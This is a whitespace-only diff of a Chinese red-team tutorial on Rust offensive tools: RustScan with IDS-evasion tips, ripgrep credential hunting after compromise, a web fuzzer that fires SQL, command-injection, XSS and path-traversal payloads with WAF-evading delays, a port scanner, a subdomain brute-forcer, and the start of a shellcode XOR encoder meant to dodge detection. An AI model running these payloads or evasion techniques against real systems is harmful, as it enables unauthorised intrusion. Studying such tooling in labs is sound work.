@@ -63,13 +63,13 @@ rustscan -a 192.168.1.100 -t 3000 --timeout 2000
 
 ```bash
 $ rustscan -a 192.168.56.102 -t 5000 -b 2000 -- -sV
- .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
- | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
- | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
- `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+ .----. .-. .-. .----..---. .----. .---. .--. .-. .-.
+ | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |
+ | .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |
+ `-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'
 The Modern Day Port Scanner.
 ________________________________________
-: https://discord.gg/GFrQsGy           :
+: https://discord.gg/GFrQsGy :
 : https://github.com/RustScan/RustScan :
  --------------------------------------
  https://admin.tryhack.me
@@ -85,12 +85,12 @@ Open 192.168.56.102:8080
 [~] Starting Nmap 7.94
 Starting Nmap 7.94 ...
 Nmap scan report for 192.168.56.102
-PORT     STATE SERVICE     VERSION
-22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
-80/tcp   open  http        Apache httpd 2.4.18
-445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
-3306/tcp open  mysql       MySQL 5.7.33
-8080/tcp open  http        Apache Tomcat 8.5.59
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
+80/tcp open http Apache httpd 2.4.18
+445/tcp open netbios-ssn Samba smbd 3.X - 4.X
+3306/tcp open mysql MySQL 5.7.33
+8080/tcp open http Apache Tomcat 8.5.59
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
@@ -105,32 +105,32 @@ rustscan -a target.com --range 1-10000 -- -sV -p {{port}} -oN services.txt
 
 # 策略 3：批量目标文件导入
 while read ip; do
-    rustscan -a "$ip" --range 1-10000 -- -sV -oN "nmap_${ip}.txt"
+ rustscan -a "$ip" --range 1-10000 -- -sV -oN "nmap_${ip}.txt"
 done < targets.txt
 
 # 策略 4：UDP 端口扫描（RustScan 只支持 TCP，UDP 用 nmap）
 rustscan -a target.com -- -sV -sC -oA tcp_results
-nmap -sU -sV -p- -oA udp_results target.com    # UDP 扫描单独跑
+nmap -sU -sV -p- -oA udp_results target.com # UDP 扫描单独跑
 ```
 
 **RustScan 的局限和绕过：**
 
 ```
 局限 1：只做 TCP connect() 扫描，不构造原始包
-        → 通过内核 TCP 栈，每个连接产生完整的 TCP 握手
-        → 比 SYN 半开扫描更容易被目标记录日志
-        → 无法设置自定义源 IP（不能做 idle scan）
+ → 通过内核 TCP 栈，每个连接产生完整的 TCP 握手
+ → 比 SYN 半开扫描更容易被目标记录日志
+ → 无法设置自定义源 IP（不能做 idle scan）
 
 局限 2：不支持 UDP
-        → 单独用 nmap -sU
+ → 单独用 nmap -sU
 
 局限 3：高并发时可能触发 IDS/IPS
-        → 降低 -t 到 500，-b 到 200
-        → 间隔 50ms 发包来模拟正常流量
+ → 降低 -t 到 500，-b 到 200
+ → 间隔 50ms 发包来模拟正常流量
 
 局限 4：某些防火墙会直接丢包（而不是发 RST）
-        → 增加 -T 超时值到 5000
-        → 或使用 nmap 的 -Pn 跳过主机发现
+ → 增加 -T 超时值到 5000
+ → 或使用 nmap 的 -Pn 跳过主机发现
 ```
 
 
@@ -215,29 +215,29 @@ rg -C 3 "password" . --type php
 
 ```bash
 # 搜索速度优化
-rg -i -n --no-heading --color=never "pattern" .  # 纯文本输出，适合管道
-rg -i -l "pattern" .                               # 只输出文件名
-rg -i -c "pattern" .                               # 统计每个文件匹配数
-rg -i --json "pattern" .                          # JSON 输出，便于脚本解析
+rg -i -n --no-heading --color=never "pattern" . # 纯文本输出，适合管道
+rg -i -l "pattern" . # 只输出文件名
+rg -i -c "pattern" . # 统计每个文件匹配数
+rg -i --json "pattern" . # JSON 输出，便于脚本解析
 
 # 文件过滤
-rg --type-list                                      # 列出所有支持的文件类型
-rg -t py -t js -t rs -t go "pattern" .             # 只搜索特定类型
-rg -T lock "pattern" .                             # 排除 Cargo.lock/package-lock.json 等
-rg -g "*.{conf,cfg,ini}" "pattern" .               # glob 模式过滤
+rg --type-list # 列出所有支持的文件类型
+rg -t py -t js -t rs -t go "pattern" . # 只搜索特定类型
+rg -T lock "pattern" . # 排除 Cargo.lock/package-lock.json 等
+rg -g "*.{conf,cfg,ini}" "pattern" . # glob 模式过滤
 
 # 搜索控制
-rg --max-depth 3 "pattern" .                       # 限制目录深度
-rg --max-filesize 10M "pattern" .                  # 忽略大文件
-rg -m 5 "pattern" .                                # 每个文件最多匹配 5 行
-rg --no-ignore "pattern" .                         # 不忽略 .gitignore 规则
-rg -u "pattern" .                                  # 搜索所有文件包括隐藏文件
+rg --max-depth 3 "pattern" . # 限制目录深度
+rg --max-filesize 10M "pattern" . # 忽略大文件
+rg -m 5 "pattern" . # 每个文件最多匹配 5 行
+rg --no-ignore "pattern" . # 不忽略 .gitignore 规则
+rg -u "pattern" . # 搜索所有文件包括隐藏文件
 
 # 多行搜索
-rg -U "user.*\n.*pass" .                           # 多行模式
+rg -U "user.*\n.*pass" . # 多行模式
 
 # 反向匹配
-rg -v "200 OK" access.log                          # 显示非 200 响应
+rg -v "200 OK" access.log # 显示非 200 响应
 ```
 
 **实战场景：攻破一个 Web 服务器后，用 rg 做后渗透信息收割：**
@@ -296,16 +296,16 @@ rustscan -a 192.168.56.0/24 -g | awk -F'->' '{print $2}' | tr -d '[]' | tr ',' '
 # ======== tokei: 代码统计（红队侦察用）========
 # 快速了解目标代码库组成
 cargo install tokei
-tokei /var/www/html/  # 看用了哪些语言、代码量
+tokei /var/www/html/ # 看用了哪些语言、代码量
 # 输出示例：
-#  PHP          45 files    12500 lines
-#  JavaScript   23 files     8900 lines
-#  Rust         12 files     3400 lines  ← 关键！得知目标有 Rust 组件
+# PHP 45 files 12500 lines
+# JavaScript 23 files 8900 lines
+# Rust 12 files 3400 lines ← 关键！得知目标有 Rust 组件
 
 # ======== bat: cat 替代带语法高亮（方便审计代码）========
 sudo pacman -S bat
-bat wp-config.php    # 比 cat 好 100 倍
-bat --show-all nginx.conf  # 显示所有隐藏字符
+bat wp-config.php # 比 cat 好 100 倍
+bat --show-all nginx.conf # 显示所有隐藏字符
 ```
 
 
@@ -353,132 +353,132 @@ use std::time::Duration;
 use tokio::time::sleep;
 
 const FUZZ_PAYLOADS: &[&str] = &[
-    "",                          // 空
-    "A",                         // 单字符
-    "%00",                       // null byte
-    "%0d%0a",                    // CRLF
-    "../../../../etc/passwd",    // 路径遍历
-    "' OR '1'='1",               // SQL 注入
-    "<script>alert(1)</script>", // XSS
-    "${7*7}",                    // SSTI 测试
-    "{{7*7}}",                   // Jinja2 SSTI
-    "$(whoami)",                 // 命令注入
-    "`whoami`",                  // 命令注入 2
-    "&whoami&",                  // 命令注入 3
-    "|whoami",                   // 命令注入 4
-    "1 AND 1=1",                 // SQL 盲注
-    "1' AND '1'='1",            // SQL 注入变体
-    "{\"$gt\":\"\"}",           // NoSQL 注入
-    "__proto__",                 // 原型污染
-    "constructor",               // 原型污染 2
-    "Infinity",                  // JSON 非标准值
-    "NaN",                       // JSON 非标准值 2
-    "-1e10000",                  // 超大浮点
+ "", // 空
+ "A", // 单字符
+ "%00", // null byte
+ "%0d%0a", // CRLF
+ "../../../../etc/passwd", // 路径遍历
+ "' OR '1'='1", // SQL 注入
+ "<script>alert(1)</script>", // XSS
+ "${7*7}", // SSTI 测试
+ "{{7*7}}", // Jinja2 SSTI
+ "$(whoami)", // 命令注入
+ "`whoami`", // 命令注入 2
+ "&whoami&", // 命令注入 3
+ "|whoami", // 命令注入 4
+ "1 AND 1=1", // SQL 盲注
+ "1' AND '1'='1", // SQL 注入变体
+ "{\"$gt\":\"\"}", // NoSQL 注入
+ "__proto__", // 原型污染
+ "constructor", // 原型污染 2
+ "Infinity", // JSON 非标准值
+ "NaN", // JSON 非标准值 2
+ "-1e10000", // 超大浮点
 ];
 
 async fn fuzz_endpoint(client: &Client, base_url: &str, endpoint: &str) {
-    let mut rng = rand::thread_rng();
+ let mut rng = rand::thread_rng();
 
-    for payload in FUZZ_PAYLOADS {
-        // 测试 GET 请求（查询参数）
-        let url = format!("{}{}?input={}", base_url, endpoint, payload);
-        match client.get(&url).timeout(Duration::from_secs(5)).send().await {
-            Ok(resp) => {
-                let status = resp.status();
-                if status.as_u16() == 500 {
-                    let body = resp.text().await.unwrap_or_default();
-                    if body.len() < 2000 {
-                        println!("[!!!] 500 错误! URL: {} | 响应: {}", url, &body[..body.len().min(200)]);
-                    } else {
-                        println!("[!!!] 500 错误! URL: {} | 响应体过大({} bytes)", url, body.len());
-                    }
-                } else if status.as_u16() >= 200 && status.as_u16() < 400 {
-                    println!("[.] {}  →  {} (OK)", url, status);
-                } else {
-                    println!("[?] {}  →  {} (异常)", url, status);
-                }
-            }
-            Err(e) => {
-                if e.is_timeout() {
-                    println!("[!!!] 超时! URL: {} (可能是 DoS)", url);
-                } else if e.is_connect() {
-                    println!("[!!!] 连接断开! URL: {} (可能是 panic/crash)", url);
-                } else {
-                    println!("[!] 请求失败: {} - {}", url, e);
-                }
-            }
-        }
+ for payload in FUZZ_PAYLOADS {
+ // 测试 GET 请求（查询参数）
+ let url = format!("{}{}?input={}", base_url, endpoint, payload);
+ match client.get(&url).timeout(Duration::from_secs(5)).send().await {
+ Ok(resp) => {
+ let status = resp.status();
+ if status.as_u16() == 500 {
+ let body = resp.text().await.unwrap_or_default();
+ if body.len() < 2000 {
+ println!("[!!!] 500 错误! URL: {} | 响应: {}", url, &body[..body.len().min(200)]);
+ } else {
+ println!("[!!!] 500 错误! URL: {} | 响应体过大({} bytes)", url, body.len());
+ }
+ } else if status.as_u16() >= 200 && status.as_u16() < 400 {
+ println!("[.] {} → {} (OK)", url, status);
+ } else {
+ println!("[?] {} → {} (异常)", url, status);
+ }
+ }
+ Err(e) => {
+ if e.is_timeout() {
+ println!("[!!!] 超时! URL: {} (可能是 DoS)", url);
+ } else if e.is_connect() {
+ println!("[!!!] 连接断开! URL: {} (可能是 panic/crash)", url);
+ } else {
+ println!("[!] 请求失败: {} - {}", url, e);
+ }
+ }
+ }
 
-        // 测试 POST 请求（JSON body）
-        let json_body = serde_json::json!({
-            "data": payload,
-            "nested": {
-                "value": payload
-            }
-        });
-        match client.post(&format!("{}{}", base_url, endpoint))
-            .json(&json_body)
-            .timeout(Duration::from_secs(5))
-            .send().await
-        {
-            Ok(resp) => {
-                let status = resp.status();
-                if status.as_u16() == 500 {
-                    println!("[!!!] POST 500 错误! {} | payload={}", endpoint, payload);
-                }
-            }
-            Err(e) => {
-                if e.is_timeout() || e.is_connect() {
-                    println!("[!!!] POST 连接问题! {} | payload={} | err={}", endpoint, payload, e);
-                }
-            }
-        }
+ // 测试 POST 请求（JSON body）
+ let json_body = serde_json::json!({
+ "data": payload,
+ "nested": {
+ "value": payload
+ }
+ });
+ match client.post(&format!("{}{}", base_url, endpoint))
+ .json(&json_body)
+ .timeout(Duration::from_secs(5))
+ .send().await
+ {
+ Ok(resp) => {
+ let status = resp.status();
+ if status.as_u16() == 500 {
+ println!("[!!!] POST 500 错误! {} | payload={}", endpoint, payload);
+ }
+ }
+ Err(e) => {
+ if e.is_timeout() || e.is_connect() {
+ println!("[!!!] POST 连接问题! {} | payload={} | err={}", endpoint, payload, e);
+ }
+ }
+ }
 
-        // 随机延迟防止触发 WAF
-        let delay = rng.gen_range(50..300);
-        sleep(Duration::from_millis(delay)).await;
-    }
+ // 随机延迟防止触发 WAF
+ let delay = rng.gen_range(50..300);
+ sleep(Duration::from_millis(delay)).await;
+ }
 }
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let args: Vec<String> = std::env::args().collect();
-    if args.len() < 2 {
-        eprintln!("用法: {} <目标URL>", args[0]);
-        eprintln!("示例: {} http://192.168.56.102", args[0]);
-        std::process::exit(1);
-    }
+ let args: Vec<String> = std::env::args().collect();
+ if args.len() < 2 {
+ eprintln!("用法: {} <目标URL>", args[0]);
+ eprintln!("示例: {} http://192.168.56.102", args[0]);
+ std::process::exit(1);
+ }
 
-    let base_url = args[1].trim_end_matches('/').to_string();
+ let base_url = args[1].trim_end_matches('/').to_string();
 
-    let client = Client::builder()
-        .danger_accept_invalid_certs(true)
-        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-        .build()?;
+ let client = Client::builder()
+ .danger_accept_invalid_certs(true)
+ .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+ .build()?;
 
-    let endpoints = vec![
-        "/api/users",
-        "/api/login",
-        "/api/search",
-        "/api/upload",
-        "/api/data",
-        "/query",
-        "/search",
-        "/login",
-        "/register",
-        "/profile",
-    ];
+ let endpoints = vec![
+ "/api/users",
+ "/api/login",
+ "/api/search",
+ "/api/upload",
+ "/api/data",
+ "/query",
+ "/search",
+ "/login",
+ "/register",
+ "/profile",
+ ];
 
-    println!("[*] 开始对 {} 进行 fuzz 测试", base_url);
-    println!("[*] 测试端点: {:?}", endpoints);
-    println!("[*] 总 payload 数: {} × {} = {}\n", FUZZ_PAYLOADS.len(), endpoints.len(), FUZZ_PAYLOADS.len() * endpoints.len());
+ println!("[*] 开始对 {} 进行 fuzz 测试", base_url);
+ println!("[*] 测试端点: {:?}", endpoints);
+ println!("[*] 总 payload 数: {} × {} = {}\n", FUZZ_PAYLOADS.len(), endpoints.len(), FUZZ_PAYLOADS.len() * endpoints.len());
 
-    for endpoint in &endpoints {
-        fuzz_endpoint(&client, &base_url, endpoint).await;
-    }
+ for endpoint in &endpoints {
+ fuzz_endpoint(&client, &base_url, endpoint).await;
+ }
 
-    println!("\n[*] Fuzz 完成");
-    Ok(())
+ println!("\n[*] Fuzz 完成");
+ Ok(())
 }
 ```
 
@@ -496,8 +496,8 @@ cargo build --release
 [*] 测试端点: ["/api/users", "/api/login", "/api/search", ...]
 [*] 总 payload 数: 21 × 10 = 210
 
-[.] http://192.168.56.102:8080/api/users?input=  →  200 OK (OK)
-[?] http://192.168.56.102:8080/api/users?input=%00  →  400 Bad Request (异常)
+[.] http://192.168.56.102:8080/api/users?input= → 200 OK (OK)
+[?] http://192.168.56.102:8080/api/users?input=%00 → 400 Bad Request (异常)
 [!!!] 500 错误! URL: http://192.168.56.102:8080/api/search?input=' OR '1'='1 | 响应: {"error":"Internal Server Error","cause":"SQLx query failed: ..."}
 [!!!] 超时! URL: http://192.168.56.102:8080/api/data?input=../../../../etc/passwd (可能是 DoS)
 [!!!] 连接断开! URL: http://192.168.56.102:8080/api/upload?input=%0d%0a (可能是 panic/crash)
@@ -541,125 +541,125 @@ use tokio::time::timeout;
 #[command(name = "rust_port_scanner")]
 #[command(about = "高性能异步 TCP 端口扫描器", version = "0.1")]
 struct Args {
-    /// 目标 IP 地址
-    #[arg(short, long)]
-    target: String,
+ /// 目标 IP 地址
+ #[arg(short, long)]
+ target: String,
 
-    /// 起始端口
-    #[arg(short, long, default_value = "1")]
-    start: u16,
+ /// 起始端口
+ #[arg(short, long, default_value = "1")]
+ start: u16,
 
-    /// 结束端口
-    #[arg(short = 'e', long, default_value = "65535")]
-    end: u16,
+ /// 结束端口
+ #[arg(short = 'e', long, default_value = "65535")]
+ end: u16,
 
-    /// 最大并发连接数
-    #[arg(short, long, default_value = "1000")]
-    concurrency: usize,
+ /// 最大并发连接数
+ #[arg(short, long, default_value = "1000")]
+ concurrency: usize,
 
-    /// 连接超时（毫秒）
-    #[arg(short = 'T', long, default_value = "1000")]
-    timeout_ms: u64,
+ /// 连接超时（毫秒）
+ #[arg(short = 'T', long, default_value = "1000")]
+ timeout_ms: u64,
 
-    /// 是否显示关闭的端口
-    #[arg(short = 'v', long)]
-    verbose: bool,
+ /// 是否显示关闭的端口
+ #[arg(short = 'v', long)]
+ verbose: bool,
 }
 
 async fn scan_port(target: &str, port: u16, timeout_dur: Duration) -> (u16, bool) {
-    let addr = format!("{}:{}", target, port);
-    match timeout(timeout_dur, TcpStream::connect(&addr)).await {
-        Ok(Ok(_stream)) => (port, true),
-        _ => (port, false),
-    }
+ let addr = format!("{}:{}", target, port);
+ match timeout(timeout_dur, TcpStream::connect(&addr)).await {
+ Ok(Ok(_stream)) => (port, true),
+ _ => (port, false),
+ }
 }
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let args = Args::parse();
-    let timeout_dur = Duration::from_millis(args.timeout_ms);
-    let semaphore = Arc::new(Semaphore::new(args.concurrency));
-    let target = Arc::new(args.target.clone());
+ let args = Args::parse();
+ let timeout_dur = Duration::from_millis(args.timeout_ms);
+ let semaphore = Arc::new(Semaphore::new(args.concurrency));
+ let target = Arc::new(args.target.clone());
 
-    println!(
-        "{} {} {} [{} -> {}]",
-        "[*]".blue().bold(),
-        "扫描目标:".white(),
-        target.white().bold(),
-        args.start,
-        args.end
-    );
-    println!(
-        "{} 并发: {} | 超时: {}ms",
-        "[*]".blue().bold(),
-        args.concurrency,
-        args.timeout_ms
-    );
+ println!(
+ "{} {} {} [{} -> {}]",
+ "[*]".blue().bold(),
+ "扫描目标:".white(),
+ target.white().bold(),
+ args.start,
+ args.end
+ );
+ println!(
+ "{} 并发: {} | 超时: {}ms",
+ "[*]".blue().bold(),
+ args.concurrency,
+ args.timeout_ms
+ );
 
-    let start_time = std::time::Instant::now();
-    let mut handles = Vec::new();
+ let start_time = std::time::Instant::now();
+ let mut handles = Vec::new();
 
-    for port in args.start..=args.end {
-        let permit = semaphore.clone().acquire_owned().await;
-        let target = target.clone();
+ for port in args.start..=args.end {
+ let permit = semaphore.clone().acquire_owned().await;
+ let target = target.clone();
 
-        handles.push(tokio::spawn(async move {
-            let _permit = permit;
-            scan_port(&target, port, timeout_dur).await
-        }));
-    }
+ handles.push(tokio::spawn(async move {
+ let _permit = permit;
+ scan_port(&target, port, timeout_dur).await
+ }));
+ }
 
-    let mut open_ports: Vec<u16> = Vec::new();
-    let mut closed_count = 0;
+ let mut open_ports: Vec<u16> = Vec::new();
+ let mut closed_count = 0;
 
-    for handle in handles {
-        match handle.await {
-            Ok((port, true)) => {
-                println!("{} {}:{} {}", "[+]".green().bold(), *target, port, "开放".green());
-                open_ports.push(port);
-            }
-            Ok((port, false)) => {
-                if args.verbose {
-                    println!("{} {}:{} {}", "[-]".red(), *target, port, "关闭".red());
-                }
-                closed_count += 1;
-            }
-            Err(e) => {
-                eprintln!("{} 任务失败: {}", "[!]".yellow().bold(), e);
-            }
-        }
-    }
+ for handle in handles {
+ match handle.await {
+ Ok((port, true)) => {
+ println!("{} {}:{} {}", "[+]".green().bold(), *target, port, "开放".green());
+ open_ports.push(port);
+ }
+ Ok((port, false)) => {
+ if args.verbose {
+ println!("{} {}:{} {}", "[-]".red(), *target, port, "关闭".red());
+ }
+ closed_count += 1;
+ }
+ Err(e) => {
+ eprintln!("{} 任务失败: {}", "[!]".yellow().bold(), e);
+ }
+ }
+ }
 
-    let elapsed = start_time.elapsed();
-    let total = args.end - args.start + 1;
+ let elapsed = start_time.elapsed();
+ let total = args.end - args.start + 1;
 
-    println!("\n{}", "=".repeat(50));
-    println!(
-        "{} 扫描完成: {:.2}s",
-        "[*]".blue().bold(),
-        elapsed.as_secs_f64()
-    );
-    println!(
-        "{} 总计: {} 端口 | {} 开放 | {} 关闭",
-        "[*]".blue().bold(),
-        total,
-        format!("{}", open_ports.len()).green().bold(),
-        closed_count
-    );
+ println!("\n{}", "=".repeat(50));
+ println!(
+ "{} 扫描完成: {:.2}s",
+ "[*]".blue().bold(),
+ elapsed.as_secs_f64()
+ );
+ println!(
+ "{} 总计: {} 端口 | {} 开放 | {} 关闭",
+ "[*]".blue().bold(),
+ total,
+ format!("{}", open_ports.len()).green().bold(),
+ closed_count
+ );
 
-    if !open_ports.is_empty() {
-        println!(
-            "{} 开放端口: {}",
-            "[+]".green().bold(),
-            open_ports
-                .iter()
-                .map(|p| p.to_string())
-                .collect::<Vec<_>>()
-                .join(", ")
-        );
-    }
+ if !open_ports.is_empty() {
+ println!(
+ "{} 开放端口: {}",
+ "[+]".green().bold(),
+ open_ports
+ .iter()
+ .map(|p| p.to_string())
+ .collect::<Vec<_>>()
+ .join(", ")
+ );
+ }
 
-    Ok(())
+ Ok(())
 }
 ```
 
@@ -724,138 +724,138 @@ use trust_dns_resolver::TokioAsyncResolver;
 #[derive(Parser, Debug)]
 #[command(name = "rust_subdomain_brute")]
 struct Args {
-    /// 目标域名
-    #[arg(short, long)]
-    domain: String,
+ /// 目标域名
+ #[arg(short, long)]
+ domain: String,
 
-    /// 子域名字典文件
-    #[arg(short, long)]
-    wordlist: String,
+ /// 子域名字典文件
+ #[arg(short, long)]
+ wordlist: String,
 
-    /// 并发数
-    #[arg(short, long, default_value = "200")]
-    concurrency: usize,
+ /// 并发数
+ #[arg(short, long, default_value = "200")]
+ concurrency: usize,
 
-    /// 自定义 DNS 服务器
-    #[arg(short = 'd', long)]
-    dns_server: Option<String>,
+ /// 自定义 DNS 服务器
+ #[arg(short = 'd', long)]
+ dns_server: Option<String>,
 
-    /// 输出文件
-    #[arg(short, long)]
-    output: Option<String>,
+ /// 输出文件
+ #[arg(short, long)]
+ output: Option<String>,
 }
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let args = Args::parse();
+ let args = Args::parse();
 
-    let wordlist_content = fs::read_to_string(&args.wordlist)?;
-    let subdomains: Vec<&str> = wordlist_content
-        .lines()
-        .map(|l| l.trim())
-        .filter(|l| !l.is_empty() && !l.starts_with('#'))
-        .collect();
+ let wordlist_content = fs::read_to_string(&args.wordlist)?;
+ let subdomains: Vec<&str> = wordlist_content
+ .lines()
+ .map(|l| l.trim())
+ .filter(|l| !l.is_empty() && !l.starts_with('#'))
+ .collect();
 
-    // 构建解析器
-    let resolver = if let Some(ref dns_ip) = args.dns_server {
-        let mut config = ResolverConfig::default();
-        let mut opts = ResolverOpts::default();
-        opts.timeout = std::time::Duration::from_secs(3);
-        opts.attempts = 1;
+ // 构建解析器
+ let resolver = if let Some(ref dns_ip) = args.dns_server {
+ let mut config = ResolverConfig::default();
+ let mut opts = ResolverOpts::default();
+ opts.timeout = std::time::Duration::from_secs(3);
+ opts.attempts = 1;
 
-        let ns_group = trust_dns_resolver::config::NameServerConfigGroup::from_ips_clear(
-            &[dns_ip.parse()?],
-            53,
-            true,
-        );
-        config = ResolverConfig::from_parts(None, vec![], ns_group);
-        TokioAsyncResolver::tokio(config, opts)?
-    } else {
-        let mut opts = ResolverOpts::default();
-        opts.timeout = std::time::Duration::from_secs(3);
-        opts.attempts = 1;
-        TokioAsyncResolver::tokio(ResolverConfig::default(), opts)?
-    };
+ let ns_group = trust_dns_resolver::config::NameServerConfigGroup::from_ips_clear(
+ &[dns_ip.parse()?],
+ 53,
+ true,
+ );
+ config = ResolverConfig::from_parts(None, vec![], ns_group);
+ TokioAsyncResolver::tokio(config, opts)?
+ } else {
+ let mut opts = ResolverOpts::default();
+ opts.timeout = std::time::Duration::from_secs(3);
+ opts.attempts = 1;
+ TokioAsyncResolver::tokio(ResolverConfig::default(), opts)?
+ };
 
-    let semaphore = Arc::new(Semaphore::new(args.concurrency));
-    let domain = Arc::new(args.domain.clone());
+ let semaphore = Arc::new(Semaphore::new(args.concurrency));
+ let domain = Arc::new(args.domain.clone());
 
-    println!(
-        "{} 目标域名: {} | 字典条目: {}",
-        "[*]".blue().bold(),
-        domain.white().bold(),
-        subdomains.len()
-    );
-    println!(
-        "{} 并发: {} | DNS: {}",
-        "[*]".blue().bold(),
-        args.concurrency,
-        args.dns_server.as_deref().unwrap_or("系统默认")
-    );
-    println!();
+ println!(
+ "{} 目标域名: {} | 字典条目: {}",
+ "[*]".blue().bold(),
+ domain.white().bold(),
+ subdomains.len()
+ );
+ println!(
+ "{} 并发: {} | DNS: {}",
+ "[*]".blue().bold(),
+ args.concurrency,
+ args.dns_server.as_deref().unwrap_or("系统默认")
+ );
+ println!();
 
-    let start = Instant::now();
-    let mut handles = Vec::new();
+ let start = Instant::now();
+ let mut handles = Vec::new();
 
-    for &sub in &subdomains {
-        let permit = semaphore.clone().acquire_owned().await;
-        let resolver = resolver.clone();
-        let domain = domain.clone();
-        let sub_owned = sub.to_string();
+ for &sub in &subdomains {
+ let permit = semaphore.clone().acquire_owned().await;
+ let resolver = resolver.clone();
+ let domain = domain.clone();
+ let sub_owned = sub.to_string();
 
-        handles.push(tokio::spawn(async move {
-            let _permit = permit;
-            let fqdn = format!("{}.{}", sub_owned, domain);
+ handles.push(tokio::spawn(async move {
+ let _permit = permit;
+ let fqdn = format!("{}.{}", sub_owned, domain);
 
-            match resolver.lookup_ip(&fqdn).await {
-                Ok(lookup) => {
-                    let ips: Vec<String> = lookup.iter().map(|ip| ip.to_string()).collect();
-                    Some((fqdn, ips))
-                }
-                Err(_) => None,
-            }
-        }));
-    }
+ match resolver.lookup_ip(&fqdn).await {
+ Ok(lookup) => {
+ let ips: Vec<String> = lookup.iter().map(|ip| ip.to_string()).collect();
+ Some((fqdn, ips))
+ }
+ Err(_) => None,
+ }
+ }));
+ }
 
-    let mut found = Vec::new();
-    for handle in handles {
-        match handle.await {
-            Ok(Some((fqdn, ips))) => {
-                println!(
-                    "{} {} -> {}",
-                    "[+]".green().bold(),
-                    fqdn.green(),
-                    ips.join(", ").yellow()
-                );
-                found.push((fqdn, ips));
-            }
-            Ok(None) => {}
-            Err(e) => {
-                eprintln!("{} 任务异常: {}", "[!]".red(), e);
-            }
-        }
-    }
+ let mut found = Vec::new();
+ for handle in handles {
+ match handle.await {
+ Ok(Some((fqdn, ips))) => {
+ println!(
+ "{} {} -> {}",
+ "[+]".green().bold(),
+ fqdn.green(),
+ ips.join(", ").yellow()
+ );
+ found.push((fqdn, ips));
+ }
+ Ok(None) => {}
+ Err(e) => {
+ eprintln!("{} 任务异常: {}", "[!]".red(), e);
+ }
+ }
+ }
 
-    let elapsed = start.elapsed();
+ let elapsed = start.elapsed();
 
-    if let Some(ref output_path) = args.output {
-        let mut output_content = String::new();
-        for (fqdn, ips) in &found {
-            output_content.push_str(&format!("{} -> {}\n", fqdn, ips.join(", ")));
-        }
-        fs::write(output_path, output_content)?;
-        println!("\n{} 结果已保存到: {}", "[*]".blue(), output_path);
-    }
+ if let Some(ref output_path) = args.output {
+ let mut output_content = String::new();
+ for (fqdn, ips) in &found {
+ output_content.push_str(&format!("{} -> {}\n", fqdn, ips.join(", ")));
+ }
+ fs::write(output_path, output_content)?;
+ println!("\n{} 结果已保存到: {}", "[*]".blue(), output_path);
+ }
 
-    println!("\n{}", "=".repeat(50));
-    println!(
-        "{} 扫描完成: {:.2}s | 发现 {} 个子域名",
-        "[*]".blue().bold(),
-        elapsed.as_secs_f64(),
-        format!("{}", found.len()).green().bold()
-    );
+ println!("\n{}", "=".repeat(50));
+ println!(
+ "{} 扫描完成: {:.2}s | 发现 {} 个子域名",
+ "[*]".blue().bold(),
+ elapsed.as_secs_f64(),
+ format!("{}", found.len()).green().bold()
+ );
 
-    Ok(())
+ Ok(())
 }
 ```
 
@@ -901,185 +901,185 @@ use std::fs;
 #[derive(Parser, Debug)]
 #[command(name = "shellcode_encoder")]
 struct Args {
-    /// Shellcode 原始文件（二进制）
-    #[arg(short, long)]
-    input: String,
+ /// Shellcode 原始文件（二进制）
+ #[arg(short, long)]
+ input: String,
 
-    /// 输出格式: hex, c, python, ps1, b64, rust
-    #[arg(short, long, default_value = "hex")]
-    format: String,
+ /// 输出格式: hex, c, python, ps1, b64, rust
+ #[arg(short, long, default_value = "hex")]
+ format: String,
 
-    /// XOR 密钥（单字节，0x00-0xFF，0 表示不 XOR）
-    #[arg(short, long, default_value = "0")]
-    xor_key: u8,
+ /// XOR 密钥（单字节，0x00-0xFF，0 表示不 XOR）
+ #[arg(short, long, default_value = "0")]
+ xor_key: u8,
 
-    /// 随机 XOR 密钥
-    #[arg(short = 'r', long)]
-    random_xor: bool,
+ /// 随机 XOR 密钥
+ #[arg(short = 'r', long)]
+ random_xor: bool,
 
-    /// 分块大小（对 shellcode 做分段避免检测）
-    #[arg(short, long, default_value = "0")]
-    chunk_size: usize,
+ /// 分块大小（对 shellcode 做分段避免检测）
+ #[arg(short, long, default_value = "0")]
+ chunk_size: usize,
 
-    /// 变量名（C/Rust/PowerShell 格式用）
-    #[arg(short = 'n', long, default_value = "shellcode")]
-    var_name: String,
+ /// 变量名（C/Rust/PowerShell 格式用）
+ #[arg(short = 'n', long, default_value = "shellcode")]
+ var_name: String,
 }
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let mut args = Args::parse();
-    let raw = fs::read(&args.input)?;
-    let original_len = raw.len();
+ let mut args = Args::parse();
+ let raw = fs::read(&args.input)?;
+ let original_len = raw.len();
 
-    if args.random_xor {
-        args.xor_key = rand::thread_rng().gen_range(1..=255);
-    }
+ if args.random_xor {
+ args.xor_key = rand::thread_rng().gen_range(1..=255);
+ }
 
-    // XOR 编码
-    let processed: Vec<u8> = if args.xor_key != 0 {
-        raw.iter().map(|b| b ^ args.xor_key).collect()
-    } else {
-        raw.clone()
-    };
+ // XOR 编码
+ let processed: Vec<u8> = if args.xor_key != 0 {
+ raw.iter().map(|b| b ^ args.xor_key).collect()
+ } else {
+ raw.clone()
+ };
 
-    // 分块（可选）
-    let chunks: Vec<&[u8]> = if args.chunk_size > 0 {
-        processed.chunks(args.chunk_size).collect()
-    } else {
-        vec![&processed[..]]
-    };
